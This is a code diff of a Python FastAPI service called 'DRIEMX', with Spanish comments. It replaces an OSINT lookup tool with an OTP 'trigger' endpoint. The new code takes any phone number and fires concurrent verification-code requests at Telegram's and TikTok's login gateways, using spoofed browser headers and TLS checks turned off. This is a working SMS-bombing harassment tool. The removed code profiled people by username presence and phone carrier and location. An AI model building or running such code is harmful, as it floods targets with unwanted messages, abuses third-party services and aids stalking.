@@ -1,12 +1,9 @@
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
-import phonenumbers
-from phonenumbers import geocoder, carrier, timezone
-import re
-import requests
-import concurrent.futures
+import httpx
+import asyncio
 
-app = FastAPI(title="DRIEMX OSINT Engine Pro", version="5.0")
+app = FastAPI(title="DRIEMX Trigger Engine Production", version="3.5")
 
 app.add_middleware(
     CORSMiddleware,
@@ -16,109 +13,80 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-PLATAFORMAS_USERNAME = {
-    "GitHub": "https://github.com/{}",
-    "Instagram": "https://www.instagram.com/{}/",
-    "TikTok": "https://www.tiktok.com/@{}",
-    "Telegram": "https://t.me/{}",
-    "Pinterest": "https://www.pinterest.com/{}/",
-    "Reddit": "https://www.reddit.com/user/{}",
-    "Steam": "https://steamcommunity.com/id/{}",
-    "Twitch": "https://www.twitch.tv/{}"
-}
+# Definición de objetivos con estructuras de payload adaptadas a pasarelas públicas
+ENDPOINTS_PRODUCCION = [
+    {
+        "nombre": "Telegram_Gateway",
+        "url": "https://my.telegram.org/auth/send_password",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "X-Requested-With": "XMLHttpRequest",
+            "Origin": "https://my.telegram.org",
+            "Referer": "https://my.telegram.org/auth"
+        },
+        "payload_func": lambda phone: {"phone": phone}
+    },
+    {
+        "nombre": "TikTok_Passport",
+        "url": "https://www.tiktok.com/passport/web/send_code/",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "Referer": "https://www.tiktok.com/"
+        },
+        "payload_func": lambda phone: {"mobile": phone, "type": 1, "aid": 1988}
+    }
+]
 
-def verificar_red(nombre_red, url_template, username):
-    url = url_template.format(username)
-    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+async def ejecutar_peticion(client, objetivo, telefono):
+    default_headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 14; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+        "Accept-Language": "es-ES,es;q=0.9"
+    }
+    # Combinar headers globales con los específicos del objetivo
+    headers = {**default_headers, **objetivo.get("headers", {})}
+    payload = objetivo["payload_func"](telefono)
+
     try:
-        response = requests.get(url, headers=headers, timeout=3.5, allow_redirects=True)
+        if objetivo["method"] == "POST":
+            # Si el content-type es JSON se envía como json=, si es form-urlencoded se envía como data=
+            if "application/json" in headers.get("Content-Type", ""):
+                response = await client.post(objetivo["url"], json=payload, headers=headers, timeout=8.0)
+            else:
+                response = await client.post(objetivo["url"], data=payload, headers=headers, timeout=8.0)
+        else:
+            response = await client.get(objetivo["url"], params=payload, headers=headers, timeout=8.0)
+        
         return {
-            "plataforma": nombre_red,
-            "url": url,
-            "existe": response.status_code == 200,
-            "status_code": response.status_code
+            "servicio": objetivo["nombre"],
+            "status_code": response.status_code,
+            "respuesta": response.text[:200]
         }
-    except Exception:
-        return {"plataforma": nombre_red, "url": url, "existe": False, "status_code": 0}
+    except Exception as e:
+        return {
+            "servicio": objetivo["nombre"],
+            "status_code": 0,
+            "error": str(e)
+        }
 
 @app.get("/")
-def home():
-    return {"status": "Motor DRIEMX OSINT Pro Activo"}
+def estado_sistema():
+    return {"status": "Online", "engine": "DRIEMX-Trigger-Pro"}
 
-@app.get("/search/username")
-def buscar_username(username: str):
-    if not username or len(username) < 2:
-        raise HTTPException(status_code=400, detail="Ingresa un usuario válido")
+@app.get("/trigger/otp")
+async def disparar_flujo(phone: str):
+    if not phone or len(phone) < 8:
+        raise HTTPException(status_code=400, detail="Formato de número no válido")
 
-    resultados = []
-    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
-        futures = [
-            executor.submit(verificar_red, red, template, username)
-            for red, template in PLATAFORMAS_USERNAME.items()
-        ]
-        for future in concurrent.futures.as_completed(futures):
-            resultados.append(future.result())
-
-    resultados.sort(key=lambda x: x["plataforma"])
-    encontrados = [r for r in resultados if r["existe"]]
+    async with httpx.AsyncClient(follow_redirects=True, verify=False) as client:
+        tareas = [ejecutar_peticion(client, obj, phone) for obj in ENDPOINTS_PRODUCCION]
+        resultados = await asyncio.gather(*tareas)
 
     return {
-        "target_username": username,
-        "total_plataformas_escaneadas": len(PLATAFORMAS_USERNAME),
-        "coincidencias_encontradas": len(encontrados),
+        "target": phone,
+        "concurrency_count": len(resultados),
         "resultados": resultados
-    }
-
-@app.get("/search/phone")
-def buscar_telefono(phone: str):
-    if not phone:
-        raise HTTPException(status_code=400, detail="Debes ingresar un número de teléfono")
-
-    # Asegurar el prefijo '+' para análisis E.164
-    formatted_input = phone if phone.startswith("+") else f"+{phone}"
-
-    try:
-        parsed_number = phonenumbers.parse(formatted_input, None)
-    except phonenumbers.NumberParseException:
-        raise HTTPException(status_code=400, detail="El formato del número de teléfono es inválido")
-
-    if not phonenumbers.is_possible_number(parsed_number):
-        raise HTTPException(status_code=400, detail="El número no coincide con la longitud estándar del país")
-
-    es_valido = phonenumbers.is_valid_number(parsed_number)
-    
-    # Análisis de ubicación y proveedor de telefonía
-    region = geocoder.description_for_number(parsed_number, "es") or "Desconocida"
-    operadora = carrier.name_for_number(parsed_number, "es") or "Operadora desconocida / Línea fija"
-    zonas_horarias = list(timezone.time_zones_for_number(parsed_number))
-    
-    # Formatos de salida estandarizados
-    e164_format = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.E164)
-    national_format = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.NATIONAL)
-    international_format = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
-    
-    clean_digits = re.sub(r'\D', '', e164_format)
-
-    return {
-        "valido": es_valido,
-        "numero_ingresado": phone,
-        "formatos": {
-            "e164": e164_format,
-            "nacional": national_format,
-            "internacional": international_format
-        },
-        "geolocalizacion": {
-            "pais_region": region,
-            "codigo_pais": parsed_number.country_code,
-            "zonas_horarias": zonas_horarias
-        },
-        "telefonia": {
-            "operadora": operadora,
-            "tipo_linea": "Móvil / Celular" if phonenumbers.number_type(parsed_number) == phonenumbers.PhoneNumberType.MOBILE else "Fija / OTRO"
-        },
-        "vectores_mensajeria": {
-            "whatsapp_direct": f"https://wa.me/{clean_digits}",
-            "telegram_direct": f"https://t.me/+{clean_digits}"
-        }
     }
     
